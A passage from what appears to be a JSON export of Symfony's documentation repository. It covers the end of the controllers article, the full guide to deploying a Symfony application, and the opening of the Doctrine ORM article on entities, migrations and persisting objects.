retrieves GET and POST variables respectively\n        $request->query->get('page');\n        $request->getPayload()->get('page');\n\n        // retrieves SERVER variables\n        $request->server->get('HTTP_HOST');\n\n        // retrieves an instance of UploadedFile identified by foo\n        $request->files->get('foo');\n\n        // retrieves a COOKIE value\n        $request->cookies->get('PHPSESSID');\n\n        // retrieves an HTTP request header, with normalized, lowercase keys\n        $request->headers->get('host');\n        $request->headers->get('content-type');\n    }\n\nThe ``Request`` class has several public properties and methods that return any\ninformation you need about the request.\n\nLike the ``Request``, the ``Response`` object has a public ``headers`` property.\nThis object is of the type :class:`Symfony\\\\Component\\\\HttpFoundation\\\\ResponseHeaderBag`\nand provides methods for getting and setting response headers. The header names are\nnormalized. As a result, the name ``Content-Type`` is equivalent to\nthe name ``content-type`` or ``content_type``.\n\nIn Symfony, a controller is required to return a ``Response`` object::\n\n    use Symfony\\Component\\HttpFoundation\\Response;\n\n    // creates a simple Response with a 200 status code (the default)\n    $response = new Response('Hello '.$name, Response::HTTP_OK);\n\n    // creates a CSS-response with a 200 status code\n    $response = new Response('<style> ... </style>');\n    $response->headers->set('Content-Type', 'text/css');\n\nTo facilitate this, different response objects are included to address different\nresponse types.  Some of these are mentioned below. To learn more about the\n``Request`` and ``Response`` (and different ``Response`` classes), see the\n:ref:`HttpFoundation component documentation <component-http-foundation-request>`.\n\n.. note::\n\n    Technically, a controller can return a value other than a ``Response``.\n    However, your application is responsible for transforming that value into a\n    ``Response`` object. This is handled using :doc:`events </event_dispatcher>`\n    (specifically the :ref:`kernel.view event <component-http-kernel-kernel-view>`),\n    an advanced feature you'll learn about later.\n\nAccessing Configuration Values\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nTo get the value of any :ref:`configuration parameter <configuration-parameters>`\nfrom a controller, use the ``getParameter()`` helper method::\n\n    // ...\n    public function index(): Response\n    {\n        $contentsDir = $this->getParameter('kernel.project_dir').'/contents';\n        // ...\n    }\n\nReturning JSON Response\n~~~~~~~~~~~~~~~~~~~~~~~\n\nTo return JSON from a controller, use the ``json()`` helper method. This returns a\n``JsonResponse`` object that encodes the data automatically::\n\n    use Symfony\\Component\\HttpFoundation\\JsonResponse;\n    // ...\n\n    public function index(): JsonResponse\n    {\n        // returns '{\"username\":\"jane.doe\"}' and sets the proper Content-Type header\n        return $this->json(['username' => 'jane.doe']);\n\n        // the shortcut defines three optional arguments\n        // return $this->json($data, $status = 200, $headers = [], $context = []);\n    }\n\nIf the :doc:`serializer service </serializer>` is enabled in your\napplication, it will be used to serialize the data to JSON. Otherwise,\nthe :phpfunction:`json_encode` function is used.\n\nStreaming File Responses\n~~~~~~~~~~~~~~~~~~~~~~~~\n\nYou can use the :method:`Symfony\\\\Bundle\\\\FrameworkBundle\\\\Controller\\\\AbstractController::file`\nhelper to serve a file from inside a controller::\n\n    use Symfony\\Component\\HttpFoundation\\BinaryFileResponse;\n    // ...\n\n    public function download(): BinaryFileResponse\n    {\n        // send the file contents and force the browser to download it\n        return $this->file('/path/to/some_file.pdf');\n    }\n\nThe ``file()`` helper provides some arguments to configure its behavior::\n\n    use Symfony\\Component\\HttpFoundation\\File\\File;\n    use Symfony\\Component\\HttpFoundation\\ResponseHeaderBag;\n    // ...\n\n    public function download(): BinaryFileResponse\n    {\n        // load the file from the filesystem\n        $file = new File('/path/to/some_file.pdf');\n\n        return $this->file($file);\n\n        // rename the downloaded file\n        return $this->file($file, 'custom_name.pdf');\n\n        // display the file contents in the browser instead of downloading it\n        return $this->file('invoice_3241.pdf', 'my_invoice.pdf', ResponseHeaderBag::DISPOSITION_INLINE);\n    }\n\nSending Early Hints\n~~~~~~~~~~~~~~~~~~~\n\n`Early hints`_ tell the browser to start downloading some assets even before the\napplication sends the response content. This improves perceived performance\nbecause the browser can prefetch resources that will be needed once the full\nresponse is finally sent. These resources are commonly Javascript or CSS files,\nbut they can be any type of resource.\n\n.. note::\n\n    In order to work, the `SAPI`_ you're using must support this feature, like\n    `FrankenPHP`_.\n\nYou can send early hints from your controller action thanks to the\n:method:`Symfony\\\\Bundle\\\\FrameworkBundle\\\\Controller\\\\AbstractController::sendEarlyHints`\nmethod::\n\n    namespace App\\Controller;\n\n    use Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController;\n    use Symfony\\Component\\HttpFoundation\\Response;\n    use Symfony\\Component\\Routing\\Attribute\\Route;\n    use Symfony\\Component\\WebLink\\Link;\n\n    class HomepageController extends AbstractController\n    {\n        #[Route(\"/\", name: \"homepage\")]\n        public function index(): Response\n        {\n            $response = $this->sendEarlyHints([\n                new Link(rel: 'preconnect', href: 'https://fonts.google.com'),\n                (new Link(href: '/style.css'))->withAttribute('as', 'style'),\n                (new Link(href: '/script.js'))->withAttribute('as', 'script'),\n            ]);\n\n            // prepare the contents of the response...\n\n            return $this->render('homepage/index.html.twig', response: $response);\n        }\n    }\n\nTechnically, Early Hints are an informational HTTP response with the status code\n``103``. The ``sendEarlyHints()`` method creates a ``Response`` object with that\nstatus code and sends its headers immediately.\n\nThis way, browsers can start downloading the assets immediately; like the\n``style.css`` and ``script.js`` files in the above example. The\n``sendEarlyHints()`` method also returns the ``Response`` object, which you\nmust use to create the full response sent from the controller action.\n\nFinal Thoughts\n--------------\n\nIn Symfony, a controller is usually a class method which is used to accept\nrequests, and return a ``Response`` object. When mapped with a URL, a controller\nbecomes accessible and its response can be viewed.\n\nTo facilitate the development of controllers, Symfony provides an\n``AbstractController``.  It can be used to extend the controller class allowing\naccess to some frequently used utilities such as ``render()`` and\n``redirectToRoute()``. The ``AbstractController`` also provides the\n``createNotFoundException()`` utility which is used to return a page not found\nresponse.\n\nIn other articles, you'll learn how to use specific services from inside your controller\nthat will help you persist and fetch objects from a database, process form submissions,\nhandle caching and more.\n\nKeep Going!\n-----------\n\nNext, learn all about :doc:`rendering templates with Twig </templates>`.\n\nLearn more about Controllers\n----------------------------\n\n.. toctree::\n    :maxdepth: 1\n    :glob:\n\n    controller/*\n\n.. _`Symfony Maker`: https://symfony.com/doc/current/bundles/SymfonyMakerBundle/index.html\n.. _`unvalidated redirects security vulnerability`: https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html\n.. _`Early hints`: https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/103\n.. _`SAPI`: https://www.php.net/manual/en/function.php-sapi-name.php\n.. _`FrankenPHP`: https://frankenphp.dev\n.. _`Validate Filters`: https://www.php.net/manual/en/filter.constants.php\n.. _`phpstan/phpdoc-parser`: https://packagist.org/packages/phpstan/phpdoc-parser\n.. _`phpdocumentor/type-resolver`: https://packagist.org/packages/phpdocumentor/type-resolver\n"
        },
        {
          "name": "controller",
          "type": "tree",
          "content": null
        },
        {
          "name": "create_framework",
          "type": "tree",
          "content": null
        },
        {
          "name": "deployment.rst",
          "type": "blob",
          "size": 9.86328125,
          "content": ".. _how-to-deploy-a-symfony2-application:\n\nHow to Deploy a Symfony Application\n===================================\n\nDeploying a Symfony application can be a complex and varied task depending on\nthe setup and the requirements of your application. This article is not a\nstep-by-step guide, but is a general list of the most common requirements and\nideas for deployment.\n\n.. _symfony2-deployment-basics:\n\nSymfony Deployment Basics\n-------------------------\n\nThe typical steps taken while deploying a Symfony application include:\n\n#. Upload your code to the production server;\n#. Install your vendor dependencies (typically done via Composer and may be done\n   before uploading);\n#. Running database migrations or similar tasks to update any changed data structures;\n#. Clearing (and optionally, warming up) your cache.\n\nA deployment may also include other tasks, such as:\n\n* Tagging a particular version of your code as a release in your source control\n  repository;\n* Creating a temporary staging area to build your updated setup \"offline\";\n* Running any tests available to ensure code and/or server stability;\n* Removal of any unnecessary files from the ``public/`` directory to keep your\n  production environment clean;\n* Clearing of external cache systems (like `Memcached`_ or `Redis`_).\n\nHow to Deploy a Symfony Application\n-----------------------------------\n\nThere are several ways you can deploy a Symfony application. Start with a few\nbasic deployment strategies and build up from there.\n\nBasic File Transfer\n~~~~~~~~~~~~~~~~~~~\n\nThe most basic way of deploying an application is copying the files manually\nvia FTP/SCP (or similar method). This has its disadvantages as you lack control\nover the system as the upgrade progresses. This method also requires you\nto take some manual steps after transferring the files (see `Common Deployment Tasks`_).\n\nUsing Source Control\n~~~~~~~~~~~~~~~~~~~~\n\nIf you're using source control (e.g. Git or SVN), you can simplify by having\nyour live installation also be a copy of your repository. When you're ready to\nupgrade, fetch the latest updates from your source control\nsystem. When using Git, a common approach is to create a tag for each release\nand check out the appropriate tag on deployment (see `Git Tagging`_).\n\nThis makes updating your files *easier*, but you still need to worry about\nmanually taking other steps (see `Common Deployment Tasks`_).\n\nUsing Platforms as a Service\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nUsing a Platform as a Service (PaaS) can be a great way to deploy your Symfony\napp quickly. There are many PaaS, but we recommend `Platform.sh`_ as it\nprovides a dedicated Symfony integration and helps fund the Symfony development.\n\nUsing Build Scripts and other Tools\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nThere are also tools to help ease the pain of deployment. Some of them have been\nspecifically tailored to the requirements of Symfony.\n\n`Deployer`_\n    This is another native PHP rewrite of Capistrano, with some ready recipes for\n    Symfony.\n\n`Ansistrano`_\n    An Ansible role that allows you to configure a powerful deploy via YAML files.\n\n`Magallanes`_\n    This Capistrano-like deployment tool is built in PHP, and may be easier\n    for PHP developers to extend for their needs.\n\n`Fabric`_\n    This Python-based library provides a basic suite of operations for executing\n    local or remote shell commands and uploading/downloading files.\n\n`Capistrano`_ with `Symfony plugin`_\n    `Capistrano`_ is a remote server automation and deployment tool written in Ruby.\n    `Symfony plugin`_ is a plugin to ease Symfony related tasks, inspired by `Capifony`_\n    (which works only with Capistrano 2).\n\n.. _common-post-deployment-tasks:\n\nCommon Deployment Tasks\n-----------------------\n\nBefore and after deploying your actual source code, there are a number of common\nthings you'll need to do:\n\nA) Check Requirements\n~~~~~~~~~~~~~~~~~~~~~\n\nThere are some :ref:`technical requirements for running Symfony applications <symfony-tech-requirements>`.\nIn your development machine, the recommended way to check these requirements is\nto use `Symfony CLI`_. However, in your production server you might prefer to\nnot install the Symfony CLI tool. In those cases, install this other package in\nyour application:\n\n.. code-block:: terminal\n\n    $ composer require symfony/requirements-checker\n\nThen, make sure that the checker is included in your Composer scripts:\n\n.. code-block:: json\n\n    {\n        \"...\": \"...\",\n\n        \"scripts\": {\n            \"auto-scripts\": {\n                \"vendor/bin/requirements-checker\": \"php-script\",\n                \"...\": \"...\"\n            },\n\n            \"...\": \"...\"\n        }\n    }\n\n.. _b-configure-your-app-config-parameters-yml-file:\n\nB) Configure your Environment Variables\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nMost Symfony applications read their configuration from environment variables.\nWhile developing locally, you'll usually store these in ``.env`` and ``.env.local``\n(for local overrides). On production, you have two options:\n\n1. Create \"real\" environment variables. How you set environment variables, depends\n   on your setup: they can be set at the command line, in your Nginx configuration,\n   or via other methods provided by your hosting service;\n\n2. Or, create a ``.env.local`` file like your local development.\n\nThere is no significant advantage to either of the two options: use whatever is\nmost natural in your hosting environment.\n\n.. tip::\n\n    You might not want your application to process the ``.env.*`` files on\n    every request. You can generate an optimized ``.env.local.php`` which\n    overrides all other configuration files:\n\n    .. code-block:: terminal\n\n        $ composer dump-env prod\n\n    The generated file will contain all the configuration stored in ``.env``. If you\n    want to rely only on environment variables, generate one without any values using:\n\n    .. code-block:: terminal\n\n        $ composer dump-env prod --empty\n\n    If you don't have Composer installed on the production server, use instead\n    :ref:`the dotenv:dump Symfony command <configuration-env-var-in-prod>`.\n\nC) Install/Update your Vendors\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nYour vendors can be updated before transferring your source code (i.e.\nupdate the ``vendor/`` directory, then transfer that with your source\ncode) or afterwards on the server. Either way, update your vendors\nas you normally do:\n\n.. code-block:: terminal\n\n    $ composer install --no-dev --optimize-autoloader\n\n.. tip::\n\n    The ``--optimize-autoloader`` flag improves Composer's autoloader performance\n    significantly by building a \"class map\". The ``--no-dev`` flag ensures that\n    development packages are not installed in the production environment.\n\n.. warning::\n\n    If you get a \"class not found\" error during this step, you may need to\n    run ``export APP_ENV=prod`` (or ``export SYMFONY_ENV=prod`` if you're not\n    using :ref:`Symfony Flex <symfony-flex>`) before running this command so\n    that the ``post-install-cmd`` scripts run in the ``prod`` environment.\n\nD) Clear your Symfony Cache\n~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nMake sure you clear and warm-up your Symfony cache:\n\n.. code-block:: terminal\n\n    $ APP_ENV=prod APP_DEBUG=0 php bin/console cache:clear\n\nE) Other Things!\n~~~~~~~~~~~~~~~~\n\nThere may be lots of other things that you need to do, depending on your\nsetup:\n\n* Running any database migrations\n* Clearing your APCu cache\n* Add/edit CRON jobs\n* Restarting your workers\n* :ref:`Building and minifying your assets <how-do-i-deploy-my-encore-assets>` with Webpack Encore\n* :ref:`Compile your assets <asset-mapper-deployment>` if you're using the AssetMapper component\n* Pushing assets to a CDN\n* On a shared hosting platform using the Apache web server, you may need to\n  install the `symfony/apache-pack`_ package\n* etc.\n\nApplication Lifecycle: Continuous Integration, QA, etc.\n-------------------------------------------------------\n\nWhile this article covers the technical details of deploying, the full lifecycle\nof taking code from development up to production may have more steps:\ndeploying to staging, QA (Quality Assurance), running tests, etc.\n\nThe use of staging, testing, QA, continuous integration, database migrations\nand the capability to roll back in case of failure are all strongly advised. There\nare simple and more complex tools and one can make the deployment as easy\n(or sophisticated) as your environment requires.\n\nDon't forget that deploying your application also involves updating any dependency\n(typically via Composer), migrating your database, clearing your cache and\nother potential things like pushing assets to a CDN (see `Common Deployment Tasks`_).\n\nTroubleshooting\n---------------\n\nDeployments not Using the ``composer.json`` File\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nThe :ref:`project root directory <configuration-kernel-project-directory>`\n(whose value is used via the ``kernel.project_dir`` parameter and the\n:method:`Symfony\\\\Component\\\\HttpKernel\\\\Kernel::getProjectDir` method) is\ncalculated automatically by Symfony as the directory where the main\n``composer.json`` file is stored.\n\nIn deployments not using the ``composer.json`` file, you'll need to override the\n:method:`Symfony\\\\Component\\\\HttpKernel\\\\Kernel::getProjectDir` method\n:ref:`as explained in this section <configuration-kernel-project-directory>`.\n\nLearn More\n----------\n\n.. toctree::\n    :maxdepth: 1\n\n    deployment/proxies\n\n.. _`Capifony`: https://github.com/everzet/capifony\n.. _`Capistrano`: https://capistranorb.com/\n.. _`Fabric`: https://www.fabfile.org/\n.. _`Ansistrano`: https://ansistrano.com/\n.. _`Magallanes`: https://github.com/andres-montanez/Magallanes\n.. _`Memcached`: https://memcached.org/\n.. _`Redis`: https://redis.io/\n.. _`Symfony plugin`: https://github.com/capistrano/symfony/\n.. _`Deployer`: https://deployer.org/\n.. _`Git Tagging`: https://git-scm.com/book/en/v2/Git-Basics-Tagging\n.. _`Platform.sh`: https://symfony.com/cloud\n.. _`Symfony CLI`: https://symfony.com/download\n.. _`symfony/apache-pack`: https://packagist.org/packages/symfony/apache-pack\n"
        },
        {
          "name": "deployment",
          "type": "tree",
          "content": null
        },
        {
          "name": "doctrine.rst",
          "type": "blob",
          "size": 38.158203125,
          "content": "Databases and the Doctrine ORM\n==============================\n\n.. admonition:: Screencast\n    :class: screencast\n\n    Do you prefer video tutorials? Check out the `Doctrine screencast series`_.\n\nSymfony provides all the tools you need to use databases in your applications\nthanks to `Doctrine`_, the best set of PHP libraries to work with databases.\nThese tools support relational databases like MySQL and PostgreSQL and also\nNoSQL databases like MongoDB.\n\nDatabases are a broad topic, so the documentation is divided in three articles:\n\n* This article explains the recommended way to work with **relational databases**\n  in Symfony applications;\n* Read :doc:`this other article </doctrine/dbal>` if you need **low-level access**\n  to perform raw SQL queries to relational databases (similar to PHP's `PDO`_);\n* Read `DoctrineMongoDBBundle docs`_ if you are working with **MongoDB databases**.\n\nInstalling Doctrine\n-------------------\n\nFirst, install Doctrine support via the ``orm`` :ref:`Symfony pack <symfony-packs>`,\nas well as the MakerBundle, which will help generate some code:\n\n.. code-block:: terminal\n\n    $ composer require symfony/orm-pack\n    $ composer require --dev symfony/maker-bundle\n\nConfiguring the Database\n~~~~~~~~~~~~~~~~~~~~~~~~\n\nThe database connection information is stored as an environment variable called\n``DATABASE_URL``. For development, you can find and customize this inside ``.env``:\n\n.. code-block:: text\n\n    # .env (or override DATABASE_URL in .env.local to avoid committing your changes)\n\n    # customize this line!\n    DATABASE_URL=\"mysql://db_user:db_password@127.0.0.1:3306/db_name?serverVersion=8.0.37\"\n\n    # to use mariadb:\n    # Before doctrine/dbal < 3.7\n    # DATABASE_URL=\"mysql://db_user:db_password@127.0.0.1:3306/db_name?serverVersion=mariadb-10.5.8\"\n    # Since doctrine/dbal 3.7\n    # DATABASE_URL=\"mysql://db_user:db_password@127.0.0.1:3306/db_name?serverVersion=10.5.8-MariaDB\"\n\n    # to use sqlite:\n    # DATABASE_URL=\"sqlite:///%kernel.project_dir%/var/app.db\"\n\n    # to use postgresql:\n    # DATABASE_URL=\"postgresql://db_user:db_password@127.0.0.1:5432/db_name?serverVersion=12.19 (Debian 12.19-1.pgdg120+1)&charset=utf8\"\n\n    # to use oracle:\n    # DATABASE_URL=\"oci8://db_user:db_password@127.0.0.1:1521/db_name\"\n\n.. warning::\n\n    If the username, password, host or database name contain any character considered\n    special in a URI (such as ``: / ? # [ ] @ ! $ & ' ( ) * + , ; =``),\n    you must encode them. See `RFC 3986`_ for the full list of reserved characters.\n    You can use the :phpfunction:`urlencode` function to encode them or\n    the :ref:`urlencode environment variable processor <urlencode_environment_variable_processor>`.\n    In this case you need to remove the ``resolve:`` prefix in ``config/packages/doctrine.yaml``\n    to avoid errors: ``url: '%env(DATABASE_URL)%'``\n\nNow that your connection parameters are setup, Doctrine can create the ``db_name``\ndatabase for you:\n\n.. code-block:: terminal\n\n    $ php bin/console doctrine:database:create\n\nThere are more options in ``config/packages/doctrine.yaml`` that you can configure,\nincluding your ``server_version`` (e.g. 8.0.37 if you're using MySQL 8.0.37), which may\naffect how Doctrine functions.\n\n.. tip::\n\n    There are many other Doctrine commands. Run ``php bin/console list doctrine``\n    to see a full list.\n\n.. _doctrine-adding-mapping:\n\nCreating an Entity Class\n------------------------\n\nSuppose you're building an application where products need to be displayed.\nWithout even thinking about Doctrine or databases, you already know that\nyou need a ``Product`` object to represent those products.\n\nYou can use the ``make:entity`` command to create this class and any fields you\nneed. The command will ask you some questions - answer them like done below:\n\n.. code-block:: bash\n\n    $ php bin/console make:entity\n\n    Class name of the entity to create or update:\n    > Product\n\n    New property name (press <return> to stop adding fields):\n    > name\n\n    Field type (enter ? to see all types) [string]:\n    > string\n\n    Field length [255]:\n    > 255\n\n    Can this field be null in the database (nullable) (yes/no) [no]:\n    > no\n\n    New property name (press <return> to stop adding fields):\n    > price\n\n    Field type (enter ? to see all types) [string]:\n    > integer\n\n    Can this field be null in the database (nullable) (yes/no) [no]:\n    > no\n\n    New property name (press <return> to stop adding fields):\n    >\n    (press enter again to finish)\n\nWhoa! You now have a new ``src/Entity/Product.php`` file::\n\n    // src/Entity/Product.php\n    namespace App\\Entity;\n\n    use App\\Repository\\ProductRepository;\n    use Doctrine\\ORM\\Mapping as ORM;\n\n    #[ORM\\Entity(repositoryClass: ProductRepository::class)]\n    class Product\n    {\n        #[ORM\\Id]\n        #[ORM\\GeneratedValue]\n        #[ORM\\Column]\n        private ?int $id = null;\n\n        #[ORM\\Column(length: 255)]\n        private ?string $name = null;\n\n        #[ORM\\Column]\n        private ?int $price = null;\n\n        public function getId(): ?int\n        {\n            return $this->id;\n        }\n\n        // ... getter and setter methods\n    }\n\n.. tip::\n\n    Starting in `MakerBundle`_: v1.57.0 - You can pass either ``--with-uuid`` or\n    ``--with-ulid`` to ``make:entity``. Leveraging Symfony's :doc:`Uid Component </components/uid>`,\n    this generates an entity with the ``id`` type as :ref:`Uuid <uuid>`\n    or :ref:`Ulid <ulid>` instead of ``int``.\n\n.. note::\n\n    Starting in v1.44.0 - `MakerBundle`_: only supports entities using PHP attributes.\n\n.. note::\n\n    Confused why the price is an integer? Don't worry: this is just an example.\n    But, storing prices as integers (e.g. 100 = $1 USD) can avoid rounding issues.\n\n.. warning::\n\n    There is a `limit of 767 bytes for the index key prefix`_ when using\n    InnoDB tables in MySQL 5.6 and earlier versions. String columns with 255\n    character length and ``utf8mb4`` encoding surpass that limit. This means\n    that any column of type ``string`` and ``unique=true`` must set its\n    maximum ``length`` to ``190``. Otherwise, you'll see this error:\n    *\"[PDOException] SQLSTATE[42000]: Syntax error or access violation:\n    1071 Specified key was too long; max key length is 767 bytes\"*.\n\nThis class is called an \"entity\". And soon, you'll be able to save and query Product\nobjects to a ``product`` table in your database. Each property in the ``Product``\nentity can be mapped to a column in that table. This is usually done with attributes:\nthe ``#[ORM\\Column(...)]`` comments that you see above each property:\n\n.. raw:: html\n\n    <object data=\"_images/doctrine/mapping_single_entity.svg\" type=\"image/svg+xml\"\n        alt=\"Doctrine mapping between properties of a Product PHP object and the data in the product database table\"\n    ></object>\n\nThe ``make:entity`` command is a tool to make life easier. But this is *your* code:\nadd/remove fields, add/remove methods or update configuration.\n\nDoctrine supports a wide variety of field types, each with their own options.\nCheck out the `list of Doctrine mapping types`_ in the Doctrine documentation.\nIf you want to use XML instead of attributes, add ``type: xml`` and\n``dir: '%kernel.project_dir%/config/doctrine'`` to the entity mappings in your\n``config/packages/doctrine.yaml`` file.\n\n.. warning::\n\n    Be careful not to use reserved SQL keywords as your table or column names\n    (e.g. ``GROUP`` or ``USER``). See Doctrine's `Reserved SQL keywords documentation`_\n    for details on how to escape these. Or, change the table name with\n    ``#[ORM\\Table(name: 'groups')]`` above the class or configure the column name with\n    the ``name: 'group_name'`` option.\n\n.. _doctrine-creating-the-database-tables-schema:\n\nMigrations: Creating the Database Tables/Schema\n-----------------------------------------------\n\nThe ``Product`` class is fully-configured and ready to save to a ``product`` table.\nIf you just defined this class, your database doesn't actually have the ``product``\ntable yet. To add it, you can leverage the `DoctrineMigrationsBundle`_, which is\nalready installed:\n\n.. code-block:: terminal\n\n    $ php bin/console make:migration\n\n.. tip::\n\n    Starting in `MakerBundle`_: v1.56.0 - Passing ``--formatted`` to ``make:migration``\n    generates a nice and tidy migration file.\n\nIf everything worked, you should see something like this:\n\n.. code-block:: text\n\n    SUCCESS!\n\n    Next: Review the new migration \"migrations/Version20211116204726.php\"\n    Then: Run the migration with php bin/console doctrine:migrations:migrate\n\nIf you open this file, it contains the SQL needed to update your database! To run\nthat SQL, execute your migrations:\n\n.. code-block:: terminal\n\n    $ php bin/console doctrine:migrations:migrate\n\nThis command executes all migration files that have not already been run against\nyour database. You should run this command on production when you deploy to keep\nyour production database up-to-date.\n\n.. _doctrine-add-more-fields:\n\nMigrations & Adding more Fields\n-------------------------------\n\nBut what if you need to add a new field property to ``Product``, like a\n``description``? You can edit the class to add the new property. But, you can\nalso use ``make:entity`` again:\n\n.. code-block:: bash\n\n    $ php bin/console make:entity\n\n    Class name of the entity to create or update\n    > Product\n\n    New property name (press <return> to stop adding fields):\n    > description\n\n    Field type (enter ? to see all types) [string]:\n    > text\n\n    Can this field be null in the database (nullable) (yes/no) [no]:\n    > no\n\n    New property name (press <return> to stop adding fields):\n    >\n    (press enter again to finish)\n\nThis adds the new ``description`` property and ``getDescription()`` and ``setDescription()``\nmethods:\n\n.. code-block:: diff\n\n      // src/Entity/Product.php\n      // ...\n    +  use Doctrine\\DBAL\\Types\\Types;\n\n      class Product\n      {\n          // ...\n\n    +     #[ORM\\Column(type: Types::TEXT)]\n    +     private string $description;\n\n          // getDescription() & setDescription() were also added\n      }\n\nThe new property is mapped, but it doesn't exist yet in the ``product`` table. No\nproblem! Generate a new migration:\n\n.. code-block:: terminal\n\n    $ php bin/console make:migration\n\nThis time, the SQL in the generated file will look like this:\n\n.. code-block:: sql\n\n    ALTER TABLE product ADD description LONGTEXT NOT NULL\n\nThe migration system is *smart*. It compares all of your entities with the current\nstate of the database and generates the SQL needed to synchronize them! Like\nbefore, execute your migrations:\n\n.. code-block:: terminal\n\n    $ php bin/console doctrine:migrations:migrate\n\n.. warning::\n\n    If you are using an SQLite database, you'll see the following error:\n    *PDOException: SQLSTATE[HY000]: General error: 1 Cannot add a NOT NULL\n    column with default value NULL*. Add a ``nullable=true`` option to the\n    ``description`` property to fix the problem.\n\nThis will only execute the *one* new migration file, because DoctrineMigrationsBundle\nknows that the first migration was already executed earlier. Behind the scenes, it\nmanages a ``migration_versions`` table to track this.\n\nEach time you make a change to your schema, run these two commands to generate the\nmigration and then execute it. Be sure to commit the migration files and execute\nthem when you deploy.\n\n.. _doctrine-generating-getters-and-setters:\n\n.. tip::\n\n    If you prefer to add new properties manually, the ``make:entity`` command can\n    generate the getter & setter methods for you:\n\n    .. code-block:: terminal\n\n        $ php bin/console make:entity --regenerate\n\n    If you make some changes and want to regenerate *all* getter/setter methods,\n    also pass ``--overwrite``.\n\nPersisting Objects to the Database\n----------------------------------\n\nIt's time to save a ``Product`` object to the database! Let's create a new controller\nto experiment:\n\n.. code-block:: terminal\n\n    $ php bin/console make:controller ProductController\n\nInside the controller, you can create a new ``Product`` object, set data on it,\nand save it::\n\n    // src/Controller/ProductController.php\n    namespace App\\Controller;\n\n    // ...\n    use App\\Entity\\Product;\n    use Doctrine\\ORM\\EntityManagerInterface;\n    use Symfony\\Component\\HttpFoundation\\Response;\n    use Symfony\\Component\\Routing\\Attribute\\Route;\n\n    class ProductController extends AbstractController\n    {\n        #[Route('/product', name: 'create_product')]\n        public function createProduct(EntityManagerInterface $entityManager): Response\n        {\n            $product = new Product();\n            $product->setName('Keyboard');\n            $product->setPrice(1999);\n            $product->setDescription('Ergonomic and stylish!');\n\n            // tell Doctrine you want to (eventually) save the Product (no queries yet)\n            $entityManager->persist($product);\n\n            // actually executes the queries (i.e. the INSERT query)\n            $entityManager->flush();\n\n            return new Response('Saved new product with id '.$product->getId());\n        }\n    }\n\nTry it out!\n\n    http://localhost:8000/product\n\nCongratulations! You just created your first row in the ``product`` table. To prove it,\nyou can query the database directly:\n\n.. code-block:: terminal\n\n    $ php bin/console dbal:run-sql 'SELECT * FROM product'\n\n    # on Windows systems not using Powershell, run this command instead:\n    # php bin/console dbal:run-sql \"SELECT * FROM product\"\n\nTake a look at the previous example in more detail:\n\n.. _doctrine-entity-manager:\n\n* **line 13** The ``EntityManagerInterface $entityManager`` argument tells Symfony\n  to :ref:`inject the Entity Manager service <services-constructor-injection>` into\n  the controller method. This object is responsible for saving objects to, and\n  fetching objects from, the database.\n\n* **lines 15-18** In this section, you instantiate and work with the ``$product``\n  object like any other normal PHP object.\n\n* **line 21** The ``persist($product)`` call tells Doctrine to \"manage\" the\n  ``$product`` object. This does **not** cause a query to be made to the database.\n\n* **line 24** When the ``flush()`` method is called, Doctrine looks through\n  all of the objects that it's managing to see if they need to be persisted\n  to the database. In this example, the ``$product`` object's data doesn't\n  exist in the database, so the entity manager executes an ``INSERT`` query,\n  creating a new row in the ``product`` table.\n\n.. note::\n\n    If the ``flush()`` call fails, a ``Doctrine\\ORM\\ORMException`` exception\n    is thrown. See `Transactions and Concurrency`_.\n\nWhether you're creating or updating objects, the workflow is always the same: Doctrine\nis smart enough to know if it should INSERT or UPDATE your entity.\n\n.. _automatic_object_validation:\n\nValidating Objects\n------------------\n\n:doc:`The Symfony validator </validation>` can reuse Doctrine metadata to perform\nsome basic validation tasks. First, add or configure the\n:ref:`auto_mapping option <reference-validation-auto-mapping>` to define which\nentities should be introspected by Symfony to add automatic validation constraints.\n\nConsider the following controller code::\n\n    // src/Controller/ProductController.php\n    namespace App\\Controller;\n\n    use App\\Entity\\Product;\n    use Symfony\\Component\\HttpFoundation\\Response;\n    use Symfony\\Component\\Routing\\Attribute\\Route;\n    use Symfony\\Component\\Validator\\Validator\\ValidatorInterface;\n    // ...\n\n    class ProductController extends AbstractController\n    {\n        #[Route('/product', name: 'create_product')]\n        public function createProduct(ValidatorInterface $validator): Response\n        {\n            $product = new Product();\n\n            // ... update the product data somehow (e.g. with a form) ...\n\n            $errors = $validator->validate($product);\n            if (count($errors) > 0) {\n                return new Response((string) $errors, 400);\n            }\n\n            // ...\n        }\n    }\n\nAlthough the ``Product`` entity doesn't define any explicit\n:doc:`validation configuration </validation>`, if the ``auto_mapping`` option\nincludes it in the list of entities to introspect, Symfony will infer some\nvalidation rules for it and will apply them.\n\nFor example, given that the ``name`` property can't be ``null`` in the database, a\n:doc:`NotNull constraint </reference/constraints/NotNull>` is added automatically\nto the property (if it doesn't contain that constraint already).\n\nThe following table summarizes the mapping between Doctrine metadata and\nthe corresponding validation constraints added automatically by Symfony:\n\n==================  =========================================================  =====\nDoctrine attribute  Validation constraint                                      Notes\n==================  =========================================================  =====\n``nullable=false``  :doc:`NotNull </reference/constraints/NotNull>`            Requires installing the :doc:`PropertyInfo component </components/property_info>`\n``type``            :doc:`Type </reference/constraints/Type>`                  Requires installing the :doc:`PropertyInfo component </components/property_info>`\n``unique=true``     :doc:`UniqueEntity </reference/constraints/UniqueEntity>`\n``length``          :doc:`Length </reference/constraints/Length>`\n==================  =========================================================  =====\n\nBecause :doc:`the Form component </forms>` as well as `API Platform`_ internally\nuse the Validator component, all your forms and web APIs will also automatically\nbenefit from these automatic validation constraints.\n\nThis automatic validation is a nice feature to improve your productivity, but it\ndoesn't replace the validation configuration entirely. You still need to add\nsome :doc:`validation constraints </reference/constraints>` to ensure that data\nprovided by the user is correct.\n\nFetching Objects from the Database\n----------------------------------\n\nFetching an object back out of the database is even easier. Suppose you want to\nbe able to go to ``/product/1`` to see your new product::\n\n    // src/Controller/ProductController.php\n    namespace 